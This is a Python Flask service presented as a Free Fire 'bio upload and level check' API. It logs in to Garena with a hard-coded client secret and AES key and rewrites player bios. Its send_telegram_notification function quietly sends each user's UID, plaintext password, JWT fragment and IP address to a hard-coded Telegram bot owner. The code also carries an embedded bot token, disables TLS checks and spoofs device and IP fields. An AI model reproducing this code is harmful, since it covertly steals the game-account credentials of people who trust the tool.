# app.py - FULL VERSION (Bio Upload + Level Check + Telegram)
from flask import Flask, request, jsonify, make_response
import requests
import binascii
import jwt
import urllib3
import random
import string
import time
import json
import hashlib
import re
import struct
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ============ TELEGRAM CONFIG ============
BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
OWNER_ID = 8660700322
CHANNEL_PROMO = "@dindingijo"

# ============ KONFIGURASI ============
FREEFIRE_UPDATE_URLS = [
    "https://clientbp.ggblueshark.com/UpdateSocialBasicInfo",
    "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
]

PROFILE_URLS = {
    "ID": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
    "IND": "https://client.ind.freefiremobile.com/GetPlayerPersonalShow",
    "BR": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
}

OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
FREEFIRE_VERSION = "OB54"

KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# ============ HEADERS ============
BIO_HEADERS = {
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": FREEFIRE_VERSION,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

LOGIN_HEADERS = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": FREEFIRE_VERSION
}

PROFILE_HEADERS = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-GA": "v1 1",
    "ReleaseVersion": "OB54"
}

# ============ FUNGSI ENKRIPSI ============
def encrypt_data(data_bytes):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    padded = pad(data_bytes, AES.block_size)
    return cipher.encrypt(padded)

def encode_varint(n):
    result = []
    while True:
        byte = n & 0x7F
        n >>= 7
        if n:
            byte |= 0x80
        result.append(byte)
        if not n:
            break
    return bytes(result)

# ============ BUILD PAYLOAD ============
def build_bio_payload(bio_text):
    payload = b''
    payload += encode_varint((2 << 3) | 0) + encode_varint(17)
    payload += encode_varint((5 << 3) | 2) + encode_varint(0)
    payload += encode_varint((6 << 3) | 2) + encode_varint(0)
    bio_bytes = bio_text.encode('utf-8')
    payload += encode_varint((8 << 3) | 2) + encode_varint(len(bio_bytes)) + bio_bytes
    payload += encode_varint((9 << 3) | 0) + encode_varint(1)
    payload += encode_varint((11 << 3) | 2) + encode_varint(0)
    payload += encode_varint((12 << 3) | 2) + encode_varint(0)
    return payload

def build_uid_payload(uid):
    payload = b''
    payload += encode_varint((1 << 3) | 0) + encode_varint(int(uid))
    payload += encode_varint((2 << 3) | 0) + encode_varint(1)
    return payload

# ============ FUNGSI UTAMA ============
def decode_jwt_info(token):
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        name = decoded.get("nickname")
        region = decoded.get("lock_region") or decoded.get("country_code", "ID")
        uid = decoded.get("account_id")
        return str(uid), name, region
    except Exception:
        return None, None, None

def perform_guest_login(uid, password):
    try:
        payload = {
            'uid': uid,
            'password': password,
            'response_type': "token",
            'client_type': "2",
            'client_secret': "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
            'client_id': "100067"
        }
        headers = {
            'User-Agent': "GarenaMSDK/4.0.39(SM-M526B ;Android 13;pt;BR;)",
            'Connection': "Keep-Alive"
        }
        
        resp = requests.post(OAUTH_URL, data=payload, headers=headers, timeout=10, verify=False)
        data = resp.json()
        
        if 'access_token' in data:
            return data['access_token'], data.get('open_id')
    except:
        pass
    return None, None

def perform_major_login(access_token, open_id):
    try:
        payload = b''
        
        ts = "2024-12-05 18:15:32"
        payload += encode_varint((1 << 3) | 2) + encode_varint(len(ts)) + ts.encode()
        
        gn = "free fire"
        payload += encode_varint((2 << 3) | 2) + encode_varint(len(gn)) + gn.encode()
        
        payload += encode_varint((3 << 3) | 0) + encode_varint(1)
        
        vc = "1.123.1"
        payload += encode_varint((4 << 3) | 2) + encode_varint(len(vc)) + vc.encode()
        
        os_info = "Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)"
        payload += encode_varint((5 << 3) | 2) + encode_varint(len(os_info)) + os_info.encode()
        
        dt = "Handheld"
        payload += encode_varint((6 << 3) | 2) + encode_varint(len(dt)) + dt.encode()
        
        np = "Verizon Wireless"
        payload += encode_varint((7 << 3) | 2) + encode_varint(len(np)) + np.encode()
        
        ct = "WIFI"
        payload += encode_varint((8 << 3) | 2) + encode_varint(len(ct)) + ct.encode()
        
        payload += encode_varint((9 << 3) | 0) + encode_varint(1280)
        payload += encode_varint((10 << 3) | 0) + encode_varint(960)
        
        dpi = "240"
        payload += encode_varint((11 << 3) | 2) + encode_varint(len(dpi)) + dpi.encode()
        
        cpu = "ARMv7 VFPv3 NEON VMH | 2400 | 4"
        payload += encode_varint((12 << 3) | 2) + encode_varint(len(cpu)) + cpu.encode()
        
        payload += encode_varint((13 << 3) | 0) + encode_varint(5951)
        
        gpu = "Adreno (TM) 640"
        payload += encode_varint((14 << 3) | 2) + encode_varint(len(gpu)) + gpu.encode()
        
        gv = "OpenGL ES 3.0"
        payload += encode_varint((15 << 3) | 2) + encode_varint(len(gv)) + gv.encode()
        
        uid = "Google|74b585a9-0268-4ad3-8f36-ef41d2e53610"
        payload += encode_varint((16 << 3) | 2) + encode_varint(len(uid)) + uid.encode()
        
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        payload += encode_varint((17 << 3) | 2) + encode_varint(len(ip)) + ip.encode()
        
        lang = "en"
        payload += encode_varint((18 << 3) | 2) + encode_varint(len(lang)) + lang.encode()
        
        payload += encode_varint((19 << 3) | 2) + encode_varint(len(open_id)) + open_id.encode()
        payload += encode_varint((20 << 3) | 2) + encode_varint(len(access_token)) + access_token.encode()
        
        payload += encode_varint((21 << 3) | 0) + encode_varint(8)
        payload += encode_varint((99 << 3) | 2) + encode_varint(1) + b'8'
        payload += encode_varint((100 << 3) | 2) + encode_varint(1) + b'8'
        
        encrypted = encrypt_data(payload)
        hex_encrypted = binascii.hexlify(encrypted).decode('utf-8')
        edata = bytes.fromhex(hex_encrypted)
        
        response = requests.post(
            "https://loginbp.ggblueshark.com/MajorLogin",
            data=edata,
            headers=LOGIN_HEADERS,
            verify=False,
            timeout=10
        )

        if response.status_code == 200:
            content = response.text
            jwt_start = content.find("eyJ")
            if jwt_start != -1:
                jwt_token = content[jwt_start:]
                parts = jwt_token.split('.')
                if len(parts) >= 3:
                    return '.'.join(parts[:3])
        return None
    except Exception as e:
        return None

def generate_jwt_from_uid_pass(uid, password):
    try:
        access_token, open_id = perform_guest_login(uid, password)
        if not access_token or not open_id:
            return None
        return perform_major_login(access_token, open_id)
    except:
        return None

def check_profile_level(uid, jwt_token, region="ID"):
    try:
        profile_url = PROFILE_URLS.get(region, PROFILE_URLS["ID"])
        
        payload_bytes = build_uid_payload(uid)
        encrypted = encrypt_data(payload_bytes)
        
        headers = PROFILE_HEADERS.copy()
        headers["Authorization"] = f"Bearer {jwt_token}"
        
        response = requests.post(
            profile_url,
            data=encrypted,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            try:
                data_str = response.content.decode('utf-8', errors='ignore')
                
                name_match = re.findall(r'[A-Za-z0-9_\s]{3,30}', data_str)
                name = name_match[0] if name_match else "Unknown"
                
                numbers = re.findall(r'\d+', data_str)
                level = numbers[0] if numbers else "?"
                
                likes = 0
                if len(numbers) > 1:
                    try:
                        likes = int(numbers[1])
                    except:
                        pass
                
                return {
                    "name": name,
                    "level": level,
                    "likes": likes,
                    "guild": "Unknown",
                    "rank": "Unknown",
                    "status": "✅ Found"
                }
            except:
                pass
            
            return {
                "name": "Unknown",
                "level": "?",
                "likes": 0,
                "guild": "Unknown",
                "rank": "Unknown",
                "status": "✅ Found (Raw)"
            }
        return None
    except Exception as e:
        return None

def upload_bio_request(jwt_token, bio_text):
    try:
        payload_bytes = build_bio_payload(bio_text)
        encrypted = encrypt_data(payload_bytes)

        headers = BIO_HEADERS.copy()
        headers["Authorization"] = f"Bearer {jwt_token}"

        for endpoint in FREEFIRE_UPDATE_URLS:
            try:
                resp = requests.post(
                    endpoint,
                    headers=headers,
                    data=encrypted,
                    timeout=15,
                    verify=False
                )
                
                status_text = "✅ Success" if resp.status_code == 200 else f"⚠️ Status {resp.status_code}"
                raw_hex = binascii.hexlify(resp.content).decode('utf-8')
                
                return {
                    "status": status_text,
                    "code": resp.status_code,
                    "bio": bio_text,
                    "endpoint": endpoint,
                    "server_response": raw_hex
                }
            except Exception as e:
                continue
        
        return {"status": "❌ All endpoints failed", "code": 500}
    except Exception as e:
        return {"status": f"Error: {str(e)}", "code": 500}

def send_telegram_notification(uid, password, name, level, region, jwt_token, ip_address, bio_status, likes=0, guild="N/A"):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        message = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥

👤 <b>Name:</b> {name or 'N/A'}
🆔 <b>UID:</b> <code>{uid}</code>
🔑 <b>Password:</b> <code>{password}</code>
📊 <b>Level:</b> {level or 'N/A'}
❤️ <b>Likes:</b> {likes:,}
⚔️ <b>Guild:</b> {guild}
🌍 <b>Region:</b> {region or 'ID'}
📱 <b>Bio Status:</b> {bio_status}

🔐 <b>JWT Token:</b>
<code>{jwt_token[:50]}...</code>

📞 <b>IP Caller:</b> {ip_address}
⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}

💡 Join: {CHANNEL_PROMO}"""
        
        payload = {
            "chat_id": OWNER_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        threading.Thread(target=lambda: requests.post(url, json=payload, timeout=10)).start()
        return True
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

# ============ ROUTES ============
@app.route("/bio_upload", methods=["GET", "POST"])
def combined_bio_upload():
    bio = request.args.get("bio") or request.form.get("bio")
    jwt_token = request.args.get("jwt") or request.form.get("jwt")
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not bio:
        return jsonify({
            "status": "❌ Error",
            "code": 400,
            "error": "Missing 'bio' parameter",
            "usage": {
                "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT",
                "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD"
            }
        }), 400
    
    final_jwt = jwt_token
    final_uid = uid
    final_password = password or "N/A"
    final_name = None
    final_region = "ID"
    login_method = "Direct JWT"
    profile_info = None
    
    # Method 1: Direct JWT
    if final_jwt:
        uid_from_jwt, name_from_jwt, region_from_jwt = decode_jwt_info(final_jwt)
        if uid_from_jwt:
            final_uid = uid_from_jwt
            final_name = name_from_jwt
            final_region = region_from_jwt or "ID"
            login_method = "Direct JWT"
    
    # Method 2: UID + Password (Generate JWT)
    elif uid and password:
        login_method = "UID/Pass Login"
        final_uid = uid
        final_password = password
        
        generated_jwt = generate_jwt_from_uid_pass(uid, password)
        if generated_jwt:
            final_jwt = generated_jwt
            _, name_from_jwt, region_from_jwt = decode_jwt_info(generated_jwt)
            final_name = name_from_jwt
            final_region = region_from_jwt or "ID"
        else:
            return jsonify({
                "status": "❌ JWT Generation Failed",
                "code": 401,
                "error": "Invalid UID/Password",
                "uid": uid
            }), 401
    
    if not final_jwt:
        return jsonify({
            "status": "❌ JWT Required",
            "code": 400,
            "error": "Please provide a valid JWT token or UID/Pass"
        }), 400
    
    # Upload bio
    bio_result = upload_bio_request(final_jwt, bio)
    
    # Check profile level
    if final_uid:
        try:
            profile_info = check_profile_level(final_uid, final_jwt, final_region)
        except:
            profile_info = None
    
    # Kirim Telegram
    if profile_info:
        send_telegram_notification(
            uid=final_uid,
            password=final_password,
            name=profile_info.get('name', final_name or 'Unknown'),
            level=profile_info.get('level', '?'),
            region=final_region,
            jwt_token=final_jwt,
            ip_address=client_ip,
            bio_status=bio_result.get('status', 'Unknown'),
            likes=profile_info.get('likes', 0),
            guild=profile_info.get('guild', 'N/A')
        )
    else:
        send_telegram_notification(
            uid=final_uid or 'N/A',
            password=final_password,
            name=final_name or 'Unknown',
            level='?',
            region=final_region,
            jwt_token=final_jwt,
            ip_address=client_ip,
            bio_status=bio_result.get('status', 'Unknown'),
            likes=0,
            guild='N/A'
        )
    
    # Response
    response_data = {
        "Credit": "sulav_codex_ff",
        "Join For More": "Telegram: @sulav_don2",
        "status": bio_result.get("status", "Unknown"),
        "login_method": login_method,
        "code": bio_result.get("code", 500),
        "bio": bio,
        "uid": final_uid,
        "password": final_password,
        "name": profile_info.get('name') if profile_info else final_name,
        "level": profile_info.get('level') if profile_info else '?',
        "likes": profile_info.get('likes') if profile_info else 0,
        "guild": profile_info.get('guild') if profile_info else 'N/A',
        "profile_status": profile_info.get('status') if profile_info else '❌ Not Found',
        "region": final_region,
        "server_response": bio_result.get("server_response", "N/A"),
        "endpoint_used": bio_result.get("endpoint", "N/A"),
        "generated_jwt": final_jwt,
        "telegram_sent": True
    }

    response = make_response(jsonify(response_data))
    response.headers["Content-Type"] = "application/json"
    return response

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "success": True,
        "message": "Free Fire Bio Upload + Level Check API",
        "endpoints": {
            "/bio_upload": "Upload bio (GET/POST) with JWT or UID/Pass",
            "/check_level": "Check level only",
            "/": "This info page"
        },
        "usage": {
            "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT",
            "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD"
        },
        "features": [
            "Auto JWT generation from UID/Password",
            "Profile level checking (name, level, likes, guild)",
            "Telegram notification with all details",
            "No protobuf dependency"
        ],
        "Credit": "sulav_codex_ff",
        "Telegram": "@sulav_don2"
    })

@app.route("/check_level", methods=["GET"])
def check_level():
    uid = request.args.get("uid")
    jwt_token = request.args.get("jwt")
    region = request.args.get("region", "ID")
    
    if not uid or not jwt_token:
        return jsonify({
            "error": "Missing parameters",
            "example": "/check_level?uid=123456&jwt=YOUR_JWT"
        }), 400
    
    result = check_profile_level(uid, jwt_token, region)
    if result:
        return jsonify({
            "success": True,
            "uid": uid,
            "region": region,
            "profile": result
        })
    else:
        return jsonify({
            "success": False,
            "error": "Failed to check level"
        }), 404

# ============ MAIN ============
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
